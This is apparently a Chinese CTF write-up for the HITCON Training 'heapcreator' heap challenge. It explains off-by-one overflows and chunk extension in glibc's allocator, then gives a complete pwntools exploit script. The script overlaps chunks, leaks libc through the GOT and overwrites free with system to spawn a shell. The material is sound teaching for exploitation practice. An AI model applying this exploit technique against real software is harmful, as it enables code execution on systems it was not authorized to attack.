---
title: lab13_heapcreator
date: 2019-07-20
categories:
- hitcon_trainning
tags: heap  off_by_one  chunk_extend
---

**<font style="font-size:25px">Off By One & chunk_extend</font>**

# Off By One

## 概念
单字节缓冲区溢出：
- 循环次数设置错误
- 字符串操作不合适
    `strlen`不考虑`\x00`来计算长度，但是`strcpy` 会把`\x00`一起复制
    ```C
    if(strlen(buffer) == 24){
        strcpy(arr,buffer);
    }
    ```
    如果`arr`的大小是24，但是实际上会拷贝25个数据。   

又叫栅栏错误。
>  是差一错误的一种。   

## 应用
应用广泛（大概），这道题里用的他更改下一个chunk的size域，达到overlap的效果。

# chunk_extend

## 如何获得各个chunk位置

在`ptmalloc`中，chunk_header是定位前后chunk的重要依据。  

- 获取下一chunk
    当前指针加上`header`中`size`的大小。
- 获取前一chunk
    当前指针减去`header`中`pre_size`的大小。
## 判断是否在使用
- 判断前一chunk是否在使用当中
    `size`中的`pre_inuse`标志。
- 判断当前chunk是否在使用当中
    查看下一个chunk的`pre_inuse`标志。
- 判断下一chunk是否在使用当中
    查看下下一个chunk的`pre_inuse`标志。

## 原理

通过更改chunk_header的数据，可以让一个chunk中包含另一个chunk，从而实现跨越chunk的操作——overlapping。  

# trick

- 当需要malloc的长度（size）没有和`0x8`对齐时（64位），实际分配到的chunk大小将会是`size & (~0xf) `。少的内存由相邻下一个chunk的`pre_size`补上。

# 思路

## 流程
是一个常见的分配堆，释放堆的题目。
- 分配  
    首先`malloc(0x10)`创建一个结构体，里面存储`size`和指向`content`的指针。此后的操作都是在这个结构体里面获得数据。  

    然后用户指定大小分配内存存储`content`。

- 释放   

    会把结构体和`content`的内存释放，并将结构体的指针置空。

- 提供编辑和打印功能

## 漏洞

在删除函数中人为地创造了一个`off_by_one`的漏洞。    

## 利用  

1. 分配两个`content`，`content_0`大小见trick，`content_1`大小需要和结构体大小相同【原因见后】，程序会分配4个chunk。其中两个是结构体。   
    ![](https://c-ssl.duitang.com/uploads/item/201907/20/20190720210558_XR5zJ.png)   
    注意这里`struct_1`和`content_1`的大小和地址。

2. 编辑`content_0`，使`struct_1`的`size`大小为`struct_1` 和 `content_1`的大小之和。    
    ![](https://c-ssl.duitang.com/uploads/item/201907/20/20190720210558_8PVlN.png)   
    在更改了`struct_1`的`size`之后，gdb解析的heap中就没有`content_1`了
    
3. delete(1)   
    ![](https://c-ssl.duitang.com/uploads/item/201907/20/20190720210558_dCeyN.png)   
    `fastbin`中的原有`struct_1`被放进了`0x40`的`bin`中。

4. 分配`0x30`大小的content    
    系统会先在`fastbin`找有没有`0x20`和`0x40`大小的chunk来作为`struct`和`content`，于是原有`struct_1`&`content_1`就被分配给了新的`struct`和`content`。
    > `content_1`大小要和`struct`相同的原因

    但是这两个实际大小都是`0x20`。   
    ![](https://c-ssl.duitang.com/uploads/item/201907/20/20190720213636_tZMYT.png)   

    当向`content_2`写入数据，就可以覆盖到`struct_2`。    
    【题目中编号仍为1，此处只为容易分辨】  

    构造chunk如图。   
    ![](https://c-ssl.duitang.com/uploads/item/201907/20/20190720213636_Cz4Lm.thumb.700_0.png)  

5. 打印`content_2`   
    前面说到所有有关`content`的操作都是根据`struct`中存的数据来的。   
    打印是打印`struct`中存的地址指向的位置。在此处改为`free_got`计算后即可得到`libc`基址。  

6. 编辑`content_2`   
    其实已经成为改`got`表的操作了。    
    将`free`的`got`表改为`system`的地址。   
    调用`free`的时候，参数是`struct`的存的地址，也就是`*(struct->addr)`。   
    所以我们可以在一开始构造`content_0`的时候，就把内容改成`/bin/sh\x00`,当delete(0)的时候就是`system("/bin/sh");`。   

# exp
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['deepin-terminal','-x','sh','-c']

def delete(index):
    sh.sendlineafter(':','4')
    sh.sendlineafter(':',str(index))

def create(sz,content):
    sh.sendlineafter(':','1')
    sh.sendlineafter(': ',str(sz))
    sh.sendafter(':',content)

def show(index):
    sh.sendlineafter(':','3')
    sh.sendlineafter(':',str(index))

    ret = u64(sh.recvuntil('\x7f')[-6:] + '\x00\x00')
    return ret

def edit(index,content):
    sh.sendlineafter(':','2')
    sh.sendlineafter(':',str(index))
    sh.sendlineafter(': ',content)

if __name__ == '__main__':
    
    sh = process('./heapcreator')
    elf =  ELF('./heapcreator')
    libc = elf.libc
    free_got = elf.got['free']
    free_libc  = libc.symbols['free']
    system_libc = libc.symbols['system']

    create(0x18,'A' * 8)
    create(0x10,'B' * 8)

    payload = '/bin/sh\x00' + cyclic(0x10) + '\x41'
    edit(0,payload)

    delete(1)

    gdb.attach(sh)
    payload = cyclic(0x10) + p64(0) + p64(0x21) + p64(0x30) + p64(free_got)
    create(0x30,payload)

    free_addr = show(1)
    system_addr = free_addr - free_libc + system_libc
    log.info('==================>free addr:{:#x}<=============='.format(free_addr))
    log.info('==================>sysytem addr:{:#x}<=============='.format(system_addr))

    edit(1,p64(system_addr))
    delete(0)
    

    sh.interactive()
    sh.close()
```

## atoi 

这里也可以改`atoi`，在`choice:`的时候限制4个字节，输入`sh\x00`就可以了。

# 一个问题

- 为什么在glibc2.27里面跑的时候，fastbin里面是空的。但是getshell是可以的？